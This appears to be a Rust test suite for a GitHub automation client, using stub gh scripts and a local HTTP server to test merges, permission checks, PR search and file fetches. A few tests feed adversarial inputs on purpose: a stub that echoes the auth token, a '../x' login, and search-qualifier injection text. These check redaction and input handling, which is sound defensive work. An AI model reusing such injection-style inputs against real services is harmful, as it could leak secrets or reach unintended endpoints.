    let (github, calls, _) = rebase_github(dir.path(), " - [x] <!-- rebase-check -->retry\n");
    let result = github
        .request_renovate_rebase(&account(), "o/r", 5, "h1")
        .await
        .unwrap();
    assert_eq!(result, RebaseCheckbox::Ticked);
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr view 5 --repo o/r --json body,headRefOid\n"
    );
}

#[tokio::test]
async fn request_renovate_rebase_writes_nothing_for_another_head() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls, _) = rebase_github(dir.path(), &renovate_body());
    let result = github
        .request_renovate_rebase(&account(), "o/r", 5, "h0")
        .await
        .unwrap();
    assert_eq!(result, RebaseCheckbox::HeadMoved);
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr view 5 --repo o/r --json body,headRefOid\n"
    );
}

#[tokio::test]
async fn head_commit_dates_a_force_push_by_the_push_not_the_commit() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"echo '{"headRefOid":"h2","timelineItems":{"nodes":[{"__typename":"PullRequestCommit","commit":{"oid":"h1","committedDate":"2026-01-01T00:00:00Z"}},{"__typename":"PullRequestCommit","commit":{"oid":"h2","committedDate":"2026-01-01T01:00:00Z"}},{"__typename":"HeadRefForcePushedEvent","createdAt":"2026-01-02T03:04:05Z","afterCommit":{"oid":"h2"}}]}}'"#,
    );
    let head = github.head_commit(&account(), "o/r", 5).await.unwrap();
    assert_eq!(head.sha, "h2");
    assert_eq!(head.pushed_at.as_deref(), Some("2026-01-02 03:04:05"));
    assert_eq!(head.committed_at.as_deref(), Some("2026-01-01 01:00:00"));
    assert!(
        fs::read_to_string(&calls)
            .unwrap()
            .starts_with("api graphql")
    );
}

#[tokio::test]
async fn head_commit_has_no_push_time_without_a_force_push() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        dir.path(),
        r#"echo '{"headRefOid":"h1","timelineItems":{"nodes":[{"__typename":"PullRequestCommit","commit":{"oid":"h1","committedDate":"2026-01-01T00:00:00Z"}}]}}'"#,
    );
    let head = github.head_commit(&account(), "o/r", 5).await.unwrap();
    assert_eq!(head.pushed_at, None);
    assert_eq!(head.committed_at.as_deref(), Some("2026-01-01 00:00:00"));
}

#[tokio::test]
async fn head_commit_uses_a_force_push_without_a_commit_node() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        dir.path(),
        r#"echo '{"headRefOid":"h2","timelineItems":{"nodes":[{"__typename":"HeadRefForcePushedEvent","createdAt":"2026-01-02T03:04:05Z","afterCommit":{"oid":"h2"}}]}}'"#,
    );
    let head = github.head_commit(&account(), "o/r", 5).await.unwrap();
    assert_eq!(head.pushed_at.as_deref(), Some("2026-01-02 03:04:05"));
    assert_eq!(head.committed_at, None);
}

#[tokio::test]
async fn head_commit_has_no_times_when_the_timeline_lacks_the_head() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        dir.path(),
        r#"echo '{"headRefOid":"h2","timelineItems":{"nodes":[]}}'"#,
    );
    let head = github.head_commit(&account(), "o/r", 5).await.unwrap();
    assert_eq!(head.sha, "h2");
    assert_eq!(head.pushed_at, None);
    assert_eq!(head.committed_at, None);
}

#[tokio::test]
async fn merged_at_reads_the_merge_time_and_none_for_an_open_pull_request() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) =
        recording_github(dir.path(), r#"echo '{"mergedAt":"2026-01-02T03:04:05Z"}'"#);
    assert_eq!(
        github
            .merged_at(&account(), "o/r", 5)
            .await
            .unwrap()
            .as_deref(),
        Some("2026-01-02 03:04:05")
    );
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr view 5 --repo o/r --json mergedAt\n"
    );
    let (github, _) = recording_github(dir.path(), r#"echo '{"mergedAt":null}'"#);
    assert_eq!(github.merged_at(&account(), "o/r", 5).await.unwrap(), None);
}

#[tokio::test]
async fn request_renovate_rebase_reports_the_gh_error() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(dir.path(), "echo 'gh: HTTP 502' >&2; exit 1");
    let err = github
        .request_renovate_rebase(&account(), "o/r", 5, "h1")
        .await
        .unwrap_err();
    assert!(err.contains("HTTP 502"), "{err}");
}

#[tokio::test]
async fn merge_head_matches_the_head_commit() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(dir.path(), "");
    github
        .merge_head(&account(), "o/r", 5, "abc123")
        .await
        .unwrap();
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr merge 5 --repo o/r --squash --delete-branch --match-head-commit abc123\n"
    );
}

#[tokio::test]
async fn file_at_decodes_the_content_and_maps_404_to_none() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"echo '{"content": "aGVsbG8g\nd29ybGQ=\n", "type": "file", "encoding": "base64"}'"#,
    );
    assert_eq!(
        github
            .file_at(&account(), "o/r", "snap/snapcraft.yaml", "main")
            .await
            .unwrap(),
        Some("hello world".into())
    );
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "api --method GET repos/o/r/contents/snap/snapcraft.yaml -f ref=main\n"
    );

    let missing = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        missing.path(),
        "echo 'gh: Not Found (HTTP 404)' >&2\nexit 1",
    );
    assert_eq!(
        github
            .file_at(&account(), "o/r", "x", "main")
            .await
            .unwrap(),
        None
    );

    let broken = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        broken.path(),
        "echo 'gh: Bad Gateway (HTTP 502)' >&2\nexit 1",
    );
    assert!(
        github
            .file_at(&account(), "o/r", "x", "main")
            .await
            .is_err()
    );
}

#[tokio::test]
async fn compare_patch_returns_the_patch_of_the_matching_file() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"echo '{"files": [{"filename": "a.txt", "patch": "@@ a"}, {"filename": "CMakeLists.txt", "patch": "@@ cmake"}, {"filename": "img.png"}]}'"#,
    );
    assert_eq!(
        github
            .compare_patch(&account(), "up/stream", "v1", "v2", "CMakeLists.txt")
            .await
            .unwrap(),
        Some("@@ cmake".into())
    );
    assert_eq!(
        github
            .compare_patch(&account(), "up/stream", "v1", "v2", "img.png")
            .await
            .unwrap(),
        None
    );
    assert_eq!(
        github
            .compare_patch(&account(), "up/stream", "v1", "v2", "none")
            .await
            .unwrap(),
        None
    );
    assert!(
        fs::read_to_string(&calls)
            .unwrap()
            .starts_with("api repos/up/stream/compare/v1...v2\n")
    );

    let missing = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        missing.path(),
        "echo 'gh: Not Found (HTTP 404)' >&2\nexit 1",
    );
    let err = github
        .compare_patch(&account(), "up/stream", "v1", "v2", "a")
        .await
        .unwrap_err();
    assert!(err.contains("not a valid comparison"), "{err}");
}

#[tokio::test]
async fn file_at_fetches_the_raw_file_when_the_content_is_not_inline() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"if [[ "$*" == *raw+json* ]]; then
  printf 'big file text'
else
  echo '{"type": "file", "content": "", "encoding": "none"}'
fi"#,
    );
    assert_eq!(
        github
            .file_at(&account(), "o/r", "big.yaml", "main")
            .await
            .unwrap(),
        Some("big file text".into())
    );
    let calls = fs::read_to_string(&calls).unwrap();
    assert!(
        calls.contains(
            "-H Accept: application/vnd.github.raw+json repos/o/r/contents/big.yaml -f ref=main"
        ),
        "{calls}"
    );
}

#[tokio::test]
async fn compare_patch_errors_when_the_listing_is_full_and_lacks_the_file() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        dir.path(),
        r#"printf '{"files": ['
for i in $(seq 1 300); do
  [ "$i" -gt 1 ] && printf ','
  printf '{"filename": "f%s", "patch": "@@"}' "$i"
done
printf ']}'"#,
    );
    let err = github
        .compare_patch(&account(), "up/stream", "v1", "v2", "CMakeLists.txt")
        .await
        .unwrap_err();
    assert!(err.contains("300 files"), "{err}");
    assert_eq!(
        github
            .compare_patch(&account(), "up/stream", "v1", "v2", "f7")
            .await
            .unwrap(),
        Some("@@".into())
    );
}

#[tokio::test]
async fn file_at_errors_for_a_submodule_and_a_directory() {
    for body in [
        r#"echo '{"type": "submodule", "name": "vendor", "sha": "abc"}'"#,
        r#"echo '{"type": "symlink", "target": "x"}'"#,
    ] {
        let dir = tempfile::tempdir().unwrap();
        let (github, calls) = recording_github(dir.path(), body);
        let err = github
            .file_at(&account(), "o/r", "vendor", "main")
            .await
            .unwrap_err();
        assert!(err.contains("not a file"), "{err}");
        assert_eq!(fs::read_to_string(&calls).unwrap().lines().count(), 1);
    }
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(dir.path(), r#"echo '[{"type": "file"}]'"#);
    assert!(
        github
            .file_at(&account(), "o/r", "dir", "main")
            .await
            .is_err()
    );
}

#[tokio::test]
async fn approve_names_the_checked_commit_so_a_later_head_is_not_approved() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(dir.path(), "");
    github
        .approve(&account(), "o/r", 5, "checked1", "ok")
        .await
        .unwrap();
    let calls = fs::read_to_string(&calls).unwrap();
    assert!(calls.contains("commit_id=checked1"), "{calls}");
    assert!(!calls.contains("pr review"), "{calls}");
}

fn account() -> Account {
    Account {
        token: Some("ghp_test".into()),
        login: "factory-bot".into(),
        name: "factory-bot".into(),
        email: "1+factory-bot@users.noreply.github.com".into(),
    }
}

#[tokio::test]
async fn access_reads_the_permissions_of_the_account_on_the_repository() {
    let dir = tempfile::tempdir().unwrap();
    let gh = script(
        dir.path(),
        "gh",
        r#"case "$2" in
  repos/o/admin) echo '{"permissions":{"admin":true,"maintain":true,"push":true}}' ;;
  repos/o/maintain) echo '{"permissions":{"admin":false,"maintain":true,"push":false}}' ;;
  repos/o/push) echo '{"permissions":{"admin":false,"maintain":false,"push":true}}' ;;
  repos/o/read) echo '{"permissions":{"admin":false,"maintain":false,"push":false}}' ;;
  repos/o/hidden) echo "gh: Not Found (HTTP 404)" >&2; exit 1 ;;
  *) echo "gh: boom" >&2; exit 1 ;;
esac"#,
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };
    let account = account();

    let access = |repo: &'static str| {
        let github = &github;
        let account = &account;
        async move { github.access(account, repo).await }
    };
    assert_eq!(access("o/admin").await, Ok(Access::Admin));
    assert_eq!(access("o/maintain").await, Ok(Access::Write));
    assert_eq!(access("o/push").await, Ok(Access::Write));
    assert_eq!(access("o/read").await, Ok(Access::Read));
    assert_eq!(access("o/hidden").await, Ok(Access::NotVisible));
    assert!(access("o/other").await.is_err());
}

#[tokio::test]
async fn user_access_reads_the_permission_of_another_login() {
    let dir = tempfile::tempdir().unwrap();
    let gh = script(
        dir.path(),
        "gh",
        r#"case "$2" in
  repos/o/r/collaborators/boss/permission) echo '{"permission":"admin","role_name":"admin"}' ;;
  repos/o/r/collaborators/keeper/permission) echo '{"permission":"write","role_name":"maintain"}' ;;
  repos/o/r/collaborators/triager/permission) echo '{"permission":"read","role_name":"triage"}' ;;
  repos/o/r/collaborators/passerby/permission) echo '{"permission":"none","role_name":"none"}' ;;
  repos/o/r/collaborators/ghost/permission) echo "gh: Not Found (HTTP 404)" >&2; exit 1 ;;
  *) echo "gh: boom $2" >&2; exit 1 ;;
esac"#,
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };
    let account = account();
    let access = |login: &'static str| {
        let github = &github;
        let account = &account;
        async move { github.user_access(account, "o/r", login).await }
    };
    assert_eq!(access("boss").await, Ok(Some(Access::Admin)));
    assert_eq!(access("keeper").await, Ok(Some(Access::Write)));
    assert_eq!(access("triager").await, Ok(Some(Access::Read)));
    assert_eq!(access("passerby").await, Ok(Some(Access::Read)));
    assert_eq!(access("ghost").await, Ok(Some(Access::Read)));
    // A bot login never reaches the API, so the catch-all error is not hit.
    assert_eq!(access("dependabot[bot]").await, Ok(Some(Access::Read)));
    assert_eq!(access("../x").await, Ok(Some(Access::Read)));
    assert!(access("other").await.is_err());
}

#[tokio::test]
async fn lookup_account_reads_the_account_the_token_runs_as() {
    let dir = tempfile::tempdir().unwrap();
    let gh = script(
        dir.path(),
        "gh",
        r#"if [ "$1 $2 $3 $4" = "api user --hostname github.com" ] && [ "$GH_TOKEN" = tok-good ]; then
  echo '{"login":"octobot","id":42}'
elif [ "$GH_TOKEN" = tok-boom ]; then
  echo "gh: boom tok-boom" >&2; exit 1
else
  echo "gh: Bad credentials (HTTP 401)" >&2; exit 1
fi"#,
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };

    let found = github.lookup_account("tok-good").await.unwrap();
    assert_eq!(
        found,
        ForgeAccount {
            login: "octobot".into(),
            id: 42
        }
    );
    assert_eq!(
        github.lookup_account("tok-bad").await,
        Err(LookupError::Rejected)
    );
    let Err(LookupError::Failed(message)) = github.lookup_account("tok-boom").await else {
        panic!("expected a failed lookup");
    };
    assert!(!message.contains("tok-boom"), "{message}");

    let account = github.account("tok-good".into(), &found);
    assert_eq!(account.token.as_deref(), Some("tok-good"));
    assert_eq!(account.name, "octobot");
    assert_eq!(account.email, "42+octobot@users.noreply.github.com");
}

#[tokio::test]
async fn a_failure_that_echoes_the_token_does_not_carry_it() {
    let dir = tempfile::tempdir().unwrap();
    let gh = script(
        dir.path(),
        "gh",
        "echo \"boom: token $GH_TOKEN\" >&2; exit 1",
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };
    let mut who = account();
    who.token = Some("ghp_secret".into());
    let err = github.merge(&who, "o/r", 15).await.unwrap_err();
    assert!(err.starts_with("gh pr merge failed:"), "{err}");
    assert!(!err.contains("ghp_secret"), "{err}");
}

#[tokio::test]
async fn a_refused_token_is_marked_where_gh_ran() {
    let dir = tempfile::tempdir().unwrap();
    let gh = script(
        dir.path(),
        "gh",
        "echo \"gh: Bad credentials (HTTP 401)\" >&2; exit 1",
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };
    let err = github.merge(&account(), "o/r", 15).await.unwrap_err();
    assert!(err.starts_with(factory_runner::REJECTED), "{err}");
}

#[tokio::test]
async fn a_refused_token_fetching_a_log_is_an_error_and_another_failure_is_noted() {
    let dir = tempfile::tempdir().unwrap();
    let checks = [FailedCheck {
        name: "Lint".into(),
        url: Some("https://github.com/o/r/actions/runs/44/job/135".into()),
    }];
    let refused = GitHub {
        gh: script(
            dir.path(),
            "gh",
            "echo 'HTTP 401: Bad credentials' >&2; exit 1",
        ),
        ..GitHub::default()
    };
    let err = refused
        .failure_report(&account(), "o/r", &checks)
        .await
        .unwrap_err();
    assert!(err.starts_with(factory_runner::REJECTED), "{err}");

    let down = GitHub {
        gh: script(dir.path(), "gh", "echo 'network is down' >&2; exit 1"),
        ..GitHub::default()
    };
    let report = down
        .failure_report(&account(), "o/r", &checks)
        .await
        .unwrap();
    assert!(report.contains("Could not fetch its log"), "{report}");
}

/// Serves `routes` (request path, status, body) over HTTP on a local port and
/// records the request lines it gets. Returns the base URL.
async fn stub_api(
    routes: &'static [(&'static str, u16, &'static str)],
) -> (String, std::sync::Arc<std::sync::Mutex<Vec<String>>>) {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let seen = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let log = std::sync::Arc::clone(&seen);
    tokio::spawn(async move {
        loop {
            let (mut socket, _) = listener.accept().await.unwrap();
            let log = std::sync::Arc::clone(&log);
            tokio::spawn(async move {
                let mut buf = vec![0; 8192];
                let n = socket.read(&mut buf).await.unwrap();
                let head = String::from_utf8_lossy(&buf[..n]).into_owned();
                log.lock().unwrap().push(head.clone());
                let path = head.split_whitespace().nth(1).unwrap_or("").to_owned();
                let (status, body) = routes
                    .iter()
                    .find(|(route, _, _)| *route == path)
                    .map_or((404, "{}"), |(_, status, body)| (*status, *body));
                let reply = format!(
                    "HTTP/1.1 {status} X\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                    body.len()
                );
                socket.write_all(reply.as_bytes()).await.unwrap();
            });
        }
    });
    (base, seen)
}

fn unauthenticated(api_base: String) -> (GitHub, Account) {
    let github = GitHub {
        gh: PathBuf::from("/nonexistent/gh"),
        api_base,
        ..GitHub::default()
    };
    let account = Account {
        token: None,
        ..account()
    };
    (github, account)
}

#[tokio::test]
async fn an_account_with_no_token_reads_a_public_repository_over_https_and_never_runs_gh() {
    let (base, seen) = stub_api(&[
        ("/repos/up/app", 200, r#"{"full_name":"up/app"}"#),
        ("/repos/up/private", 404, r#"{"message":"Not Found"}"#),
        (
            "/repos/up/limited",
            403,
            r#"{"message":"API rate limit exceeded"}"#,
        ),
        (
            "/repos/up/app/compare/v1...v2",
            200,
            r#"{"files":[{"filename":"CMakeLists.txt","patch":"@@ cmake"}]}"#,
        ),
    ])
    .await;
    let (github, account) = unauthenticated(base);

    assert_eq!(github.access(&account, "up/app").await, Ok(Access::Read));
    assert_eq!(
        github.access(&account, "up/private").await,
        Ok(Access::NotVisible)
    );
    let limited = github.access(&account, "up/limited").await.unwrap_err();
    assert!(limited.contains("HTTP 403"), "{limited}");
    assert_eq!(
        github
            .compare_patch(&account, "up/app", "v1", "v2", "CMakeLists.txt")
            .await
            .unwrap(),
        Some("@@ cmake".into())
    );
    assert!(
        seen.lock()
            .unwrap()
            .iter()
            .all(|head| !head.to_ascii_lowercase().contains("authorization"))
    );
}

const REST_PULL: &str = r#"{"number": 12, "title": "Add a flag", "body": "Why", "state": "open", "merged": false, "draft": true, "html_url": "https://github.com/o/r/pull/12", "user": {"login": "ana"}, "head": {"sha": "abc", "ref": "flag", "repo": {"full_name": "ana/r", "clone_url": "https://github.com/ana/r.git"}}, "base": {"ref": "main", "repo": {"full_name": "o/r", "clone_url": "https://github.com/o/r.git"}}}"#;

fn rest_pull(number: u64, head_repo: &str) -> String {
    format!(
        r#"{{"number": {number}, "title": "t{number}", "state": "open", "html_url": "u", "user": {{"login": "bob"}}, "head": {{"sha": "s", "ref": "b{number}", "repo": {{"full_name": "{head_repo}"}}}}, "base": {{"ref": "main", "repo": {{"full_name": "o/r"}}}}}}"#
    )
}

#[tokio::test]
async fn an_empty_search_reads_one_page_of_the_latest_open_pull_requests() {
    let dir = tempfile::tempdir().unwrap();
    let rows: Vec<String> = (1..=21)
        .map(|n| rest_pull(n, if n == 2 { "ana/r" } else { "o/r" }))
        .collect();
    let (github, calls) = recording_github(dir.path(), &format!("echo '[{}]'", rows.join(",")));
    let prs = github
        .search_open_prs(&account(), "o/r", "  ")
        .await
        .unwrap();
    assert_eq!(prs.len(), 21);
    assert!(!prs[0].fork && prs[1].fork);
    assert_eq!(prs[1].head_branch, "b2");
    assert_eq!(prs[1].base_branch, "main");
    assert_eq!(prs[1].author, "bob");
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "api --method GET repos/o/r/pulls -f state=open -f sort=updated -f direction=desc -f per_page=21\n"
    );
}

#[tokio::test]
async fn a_title_search_is_one_graphql_call_with_quoted_words() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"echo '[{"number": 7, "title": "Fix: login", "url": "u", "isDraft": true, "isCrossRepository": true, "headRefName": "fix", "baseRefName": "dev", "author": {"login": "ana"}}, {}, {"number": 8, "title": "x", "url": "v", "author": null}]'"#,
    );
    let prs = github
        .search_open_prs(&account(), "o/r", "fix: repo:x/y")
        .await
        .unwrap();
    assert_eq!(prs.len(), 2);
    assert!(prs[0].fork && prs[0].draft);
    assert_eq!(prs[0].head_branch, "fix");
    assert_eq!(prs[0].base_branch, "dev");
    assert_eq!(prs[1].author, "ghost");
    let calls = fs::read_to_string(&calls).unwrap();
    assert_eq!(calls.lines().count(), 1, "{calls}");
    assert!(
        calls.contains(r#"q=repo:o/r is:pr is:open sort:updated-desc in:title "fix:" "repo:x/y""#)
    );
    assert!(calls.contains("-F n=21"));
}

#[tokio::test]
async fn a_number_finds_that_pull_request_only_when_it_is_open() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        &format!(
            r#"case "$2" in
  repos/o/r/pulls/12) echo '{REST_PULL}' ;;
  repos/o/r/pulls/13) echo '{}' ;;
  *) echo 'gh: Not Found (HTTP 404)' >&2; exit 1 ;;
esac"#,
            REST_PULL
                .replace(r#""open""#, r#""closed""#)
                .replace("12", "13")
        ),
    );
    for query in ["12", "#12"] {
        let prs = github
            .search_open_prs(&account(), "o/r", query)
            .await
            .unwrap();
        assert_eq!(prs.len(), 1, "{query}");
        assert_eq!(prs[0].number, 12);
        assert!(prs[0].fork && prs[0].draft);
    }
    assert_eq!(
        github
            .search_open_prs(&account(), "o/r", "13")
            .await
            .unwrap(),
        Vec::new()
    );
    assert_eq!(
        github
            .search_open_prs(&account(), "o/r", "99")
            .await
            .unwrap(),
        Vec::new()
    );
    assert_eq!(fs::read_to_string(&calls).unwrap().lines().count(), 4);
}

#[tokio::test]
async fn pull_request_reads_the_head_repository_and_none_for_a_missing_one() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        dir.path(),
        &format!(
            r#"case "$2" in
  repos/o/r/pulls/12) echo '{REST_PULL}' ;;
  repos/o/r/pulls/14) echo '{}' ;;
  *) echo 'gh: Not Found (HTTP 404)' >&2; exit 1 ;;
esac"#,
            r#"{"number": 14, "state": "closed", "merged": true, "head": {"sha": "z", "ref": "gone", "repo": null}, "base": {"ref": "main", "repo": {"full_name": "o/r"}}}"#
        ),
    );
    let pr = github
        .pull_request(&account(), "o/r", 12)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(pr.state, PrState::Open);
    assert!(pr.fork && pr.draft);
    assert_eq!(
        pr.head_repo_clone_url.as_deref(),
        Some("https://github.com/ana/r.git")
    );
    assert_eq!(
        (pr.head_branch.as_str(), pr.head_sha.as_str()),
        ("flag", "abc")
    );
    assert_eq!(pr.base_branch, "main");
    assert_eq!(
        (pr.title.as_str(), pr.body.as_str(), pr.author.as_str()),
        ("Add a flag", "Why", "ana")
    );
    assert_eq!(pr.url, "https://github.com/o/r/pull/12");

    let merged = github
        .pull_request(&account(), "o/r", 14)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(merged.state, PrState::Merged);
    assert!(merged.fork);
    assert_eq!(merged.head_repo_clone_url, None);
    assert!(
        github
            .pull_request(&account(), "o/r", 99)
            .await
            .unwrap()
            .is_none()
    );
}

#[tokio::test]
async fn has_comment_finds_the_account_s_comment_on_a_later_page() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"for n in $(seq 1 150); do echo '{"login":"someone","body":"comment"}'; done
echo '{"login":"factory-bot","body":"LGTM score: 4/5\n\n<!-- id -->"}'"#,
    );
    let body = "LGTM score: 4/5\n\n<!-- id -->";
    assert!(
        github
            .has_comment(&account(), "o/r", 5, body)
            .await
            .unwrap()
    );
    assert!(
        fs::read_to_string(&calls)
            .unwrap()
            .starts_with("api --paginate repos/o/r/issues/5/comments")
    );
}

#[tokio::test]
async fn has_comment_ignores_another_author_that_quotes_the_body() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        dir.path(),
        r#"echo '{"login":"someone","body":"LGTM score: 4/5\n\n<!-- id -->"}'
echo '{"login":"factory-bot","body":"quote: LGTM score: 4/5\n\n<!-- id -->"}'"#,
    );
    let body = "LGTM score: 4/5\n\n<!-- id -->";
    assert!(
        !github
            .has_comment(&account(), "o/r", 5, body)
            .await
            .unwrap()
    );
}
